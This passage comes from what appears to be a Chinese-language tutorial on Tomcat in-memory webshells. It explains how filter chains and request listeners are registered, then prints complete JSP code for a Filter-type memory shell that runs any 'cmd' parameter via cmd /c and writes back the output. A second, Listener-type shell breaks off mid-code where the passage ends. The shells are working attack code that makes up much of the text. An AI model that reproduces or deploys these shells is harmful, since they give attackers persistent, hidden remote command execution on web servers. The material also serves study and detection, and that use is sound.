<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filterChain.addFilter(filterConfig);</span><br></pre></td></tr></table></figure></div>

<p><code>ApplicationFilterChain#addFilter</code> 函数将 <code>FilterConfig</code> 添加到 <code>filters</code> 数组中。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 向当前过滤器链添加一个要执行的过滤器。</span></span><br><span class="line"><span class="comment"> * 依赖字段说明：</span></span><br><span class="line"><span class="comment"> * - filters  ：当前链中已收集的 ApplicationFilterConfig 数组</span></span><br><span class="line"><span class="comment"> * - n        ：已加入的过滤器个数（尾插位置下标）</span></span><br><span class="line"><span class="comment"> * - INCREMENT：数组需要扩容时的固定步长</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> filterConfig 要加入链的过滤器配置（封装了 Filter 实例、init-param 等）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">addFilter</span><span class="params">(ApplicationFilterConfig filterConfig)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1) 防重复：按“同一对象引用”判断（==），</span></span><br><span class="line">    <span class="comment">//    如果链中已经存在这个 ApplicationFilterConfig 实例，则直接返回。</span></span><br><span class="line">    <span class="keyword">for</span> (ApplicationFilterConfig filter : filters) &#123;</span><br><span class="line">        <span class="keyword">if</span> (filter == filterConfig) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 扩容：当已用元素个数 n 等于数组容量时，按固定增量 INCREMENT 扩容，</span></span><br><span class="line">    <span class="comment">//    将旧数组内容拷贝到新数组，再用新数组替换。</span></span><br><span class="line">    <span class="keyword">if</span> (n == filters.length) &#123;</span><br><span class="line">        ApplicationFilterConfig[] newFilters = <span class="keyword">new</span> <span class="title class_">ApplicationFilterConfig</span>[n + INCREMENT];</span><br><span class="line">        System.arraycopy(filters, <span class="number">0</span>, newFilters, <span class="number">0</span>, n);</span><br><span class="line">        filters = newFilters;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 追加：将新的 filterConfig 放到数组尾部，并递增计数 n（尾插）。</span></span><br><span class="line">    filters[n++] = filterConfig;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>后续处理请求的时候会在 <code>org.apache.catalina.core.ApplicationFilterChain#internalDoFilter</code> 函数依次根据 <code>filters</code> 数组中的 <code>FilterConfig</code> 调用对应的 <code>doFilter</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 若还有下一个要执行的过滤器，则取出并执行它</span></span><br><span class="line"><span class="keyword">if</span> (pos &lt; n) &#123;</span><br><span class="line"><span class="comment">// 取出当前位置的过滤器配置，并将游标前移（尾递进）</span></span><br><span class="line"><span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> filters[pos++];</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 从配置中拿到实际的 Filter 实例（可能在此时懒加载/初始化）</span></span><br><span class="line">    <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> filterConfig.getFilter();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 异步支持协商：</span></span><br><span class="line">    <span class="comment">// 如果当前请求声明“支持异步”，但该 Filter 的定义标注了 asyncSupported=&quot;false&quot;，</span></span><br><span class="line">    <span class="comment">// 则在请求属性中打一个标记，提示后续链路禁用异步（容器内部识别用）</span></span><br><span class="line">    <span class="keyword">if</span> (request.isAsyncSupported() &amp;&amp;</span><br><span class="line">            <span class="string">&quot;false&quot;</span>.equalsIgnoreCase(filterConfig.getFilterDef().getAsyncSupported())) &#123;</span><br><span class="line">        request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若开启了 Java 安全管理（SecurityManager），以特权方式调用 doFilter</span></span><br><span class="line">    <span class="keyword">if</span> (Globals.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> request;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ServletResponse</span> <span class="variable">res</span> <span class="operator">=</span> response;</span><br><span class="line">        <span class="comment">// 当前用户主体，用于权限上下文</span></span><br><span class="line">        <span class="type">Principal</span> <span class="variable">principal</span> <span class="operator">=</span> ((HttpServletRequest) req).getUserPrincipal();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射调用 doFilter 的参数签名 (req, res, thisChain)</span></span><br><span class="line">        Object[] args = <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; req, res, <span class="built_in">this</span> &#125;;</span><br><span class="line">        <span class="comment">// 以特权（doAsPrivilege）执行 filter.doFilter(req, res, this)</span></span><br><span class="line">        SecurityUtil.doAsPrivilege(<span class="string">&quot;doFilter&quot;</span>, filter, classType, args, principal);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 常规路径：直接执行过滤器</span></span><br><span class="line">        filter.doFilter(request, response, <span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException | ServletException | RuntimeException e) &#123;</span><br><span class="line">    <span class="comment">// 常见异常直接透传，让上层容器处理</span></span><br><span class="line">    <span class="keyword">throw</span> e;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">    <span class="comment">// 其它 Throwable：先解包可能的 InvocationTargetException，</span></span><br><span class="line">    <span class="comment">// 再按容器约定处理不可捕获错误，最后包装为 ServletException 抛出</span></span><br><span class="line">        e = ExceptionUtils.unwrapInvocationTargetException(e);</span><br><span class="line">        ExceptionUtils.handleThrowable(e);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(sm.getString(<span class="string">&quot;filterChain.filter&quot;</span>), e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ol>
<p>通过上述流程可以知道，每次请求的 <code>FilterChain</code> 是动态匹配获取和生成的，如果想添加一个 <code>Filter</code> ，需要：</p>
<ul>
<li><p>在 <code>StandardContext</code> 中 <code>filterMaps</code> 中添加 <code>FilterMap</code>；</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">filterMap.setFilterName(name);</span><br><span class="line">filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">standardContext.addFilterMapBefore(filterMap);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>在 <code>filterConfigs</code> 中添加 <code>ApplicationFilterConfig</code>。</p>
</li>
</ul>
<p>这样程序创建时就可以找到添加的 <code>Filter</code> 了。我们不难写出对应的 Filter 型内存马：</p>
<div class="code-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;FilterMemShell&quot;</span>;</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filterConfigs.get(name) == <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)).start();</span><br><span class="line">                    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> process.getInputStream().read(bytes);</span><br><span class="line">                    servletResponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,len));</span><br><span class="line">                    process.destroy();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        filterDef.setFilterName(name);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setFilterName(name);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line"></span><br><span class="line">        filterConfigs.put(name,filterConfig);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div>

<h4 id="Listener-型内存马"><a href="#Listener-型内存马" class="headerlink" title="Listener 型内存马"></a>Listener 型内存马</h4><p>在应用中可能调用的监听器如下：</p>
<ul>
<li><code>ServletContextListener</code>：用于监听整个 Servlet 上下文（创建、销毁）</li>
<li><code>ServletContextAttributeListener</code>：对 Servlet 上下文属性进行监听（增删改属性）</li>
<li><code>ServletRequestListener</code>：对 Request 请求进行监听（创建、销毁）</li>
<li><code>ServletRequestAttributeListener</code>：对 Request 属性进行监听（增删改属性）</li>
<li><code>javax.servlet.http.HttpSessionListener</code>：对 Session 整体状态的监听</li>
<li><code>javax.servlet.http.HttpSessionAttributeListener</code>：对 Session 属性的监听</li>
</ul>
<p>可以看到 Listener 也是为一次访问的请求或生命周期进行服务的，在上述每个不同的接口中，都提供了不同的方法，用来在监听的对象发生改变时进行触发。而这些类接口，实际上都是 <code>java.util.EventListener</code> 的子接口。</p>
<p>这里我们看到，在 <code>ServletRequestListener</code> 接口中，提供了两个方法在 <code>request</code> 请求创建和销毁时进行处理，比较适合我们用来做内存马。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ServletRequestListener：请求“进入/退出”当前 Web 应用作用域时的回调钩子。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * ▸ “进入作用域”（come into scope）：</span></span><br><span class="line"><span class="comment"> *    即将进入本 Web 应用要处理的第一站（第一个 Filter 或第一个 Servlet）之前。</span></span><br><span class="line"><span class="comment"> * ▸ “退出作用域”（go out of scope）：</span></span><br><span class="line"><span class="comment"> *    处理链走完（最后一个 Servlet/第一个 Filter 返回）后、请求离开本应用时。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 典型用途：</span></span><br><span class="line"><span class="comment"> *  - 在 request 周期开始时做埋点/计时、放置 traceId、初始化 ThreadLocal 等；</span></span><br><span class="line"><span class="comment"> *  - 在结束时做资源清理（关闭句柄、移除 ThreadLocal，避免线程池泄漏）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 异步提示（Servlet 3.0+）：</span></span><br><span class="line"><span class="comment"> *  - 如果请求进入异步模式（startAsync），requestDestroyed 会在异步执行 complete()</span></span><br><span class="line"><span class="comment"> *    后才触发；期间可能发生再次调度（dispatch），不要把 requestDestroyed 误认为</span></span><br><span class="line"><span class="comment"> *    “startAsync 之后立刻发生”。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> Servlet 2.4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ServletRequestListener</span> <span class="keyword">extends</span> <span class="title class_">EventListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 请求即将“退出”当前 Web 应用的作用域时回调。</span></span><br><span class="line"><span class="comment">     * 常用于：统计耗时、释放与请求绑定的资源、清理 ThreadLocal 等。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> sre 事件对象；可通过 sre.getServletRequest() 取得当前请求，</span></span><br><span class="line"><span class="comment">     *            通过 sre.getServletContext() 取得应用级上下文。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 请求即将“进入”当前 Web 应用的作用域时回调（在第一个 Filter/Servlet 之前）。</span></span><br><span class="line"><span class="comment">     * 常用于：记录起始时间、生成并塞入 traceId、准备请求级别的上下文数据等。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> sre 事件对象；可通过 sre.getServletRequest() 取得当前请求，</span></span><br><span class="line"><span class="comment">     *            通过 sre.getServletContext() 取得应用级上下文。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>Tomcat 中 <code>EventListeners</code> 存放在 <code>StandardContext</code> 的 <code>applicationEventListenersList</code> 属性中，同样可以使用 <code>StandardContext</code> 的相关 add 方法添加。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将一个“应用事件监听器”追加到（已初始化的）应用事件监听器列表的末尾。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 说明与注意事项：</span></span><br><span class="line"><span class="comment"> * - 这里只是把 listener 引用加入内部列表 applicationEventListenersList，</span></span><br><span class="line"><span class="comment"> *   不做空值校验、重复校验或类型校验；</span></span><br><span class="line"><span class="comment"> * - 按 Servlet 规范，listener 一般应实现诸如：</span></span><br><span class="line"><span class="comment"> *   ServletContextListener / ServletRequestListener / HttpSessionListener</span></span><br><span class="line"><span class="comment"> *   等事件接口（以及对应的 *AttributeListener、AsyncListener 等）；</span></span><br><span class="line"><span class="comment"> * - 追加到“末尾”意味着后续触发事件时的回调顺序会受加入顺序影响；</span></span><br><span class="line"><span class="comment"> * - 本方法未做同步控制，线程安全由调用方或上层生命周期管理负责。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> listener 要添加的监听器实例</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addApplicationEventListener</span><span class="params">(Object listener)</span> &#123;</span><br><span class="line">    <span class="comment">// 直接尾插进内部列表；不做任何额外检查或初始化动作</span></span><br><span class="line">    applicationEventListenersList.add(listener);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<div class="code-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">            <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// cmd /c dir 是执行完dir命令后关闭命令窗口</span></span><br><span class="line">                    in = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">out</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">requestF</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                    requestF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) requestF.get(req);</span><br><span class="line">                    <span class="comment">// 命令执行结果写回Response</span></span><br><span class="line">                    request.getResponse().getWriter().write(out);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IllegalAccessException e) 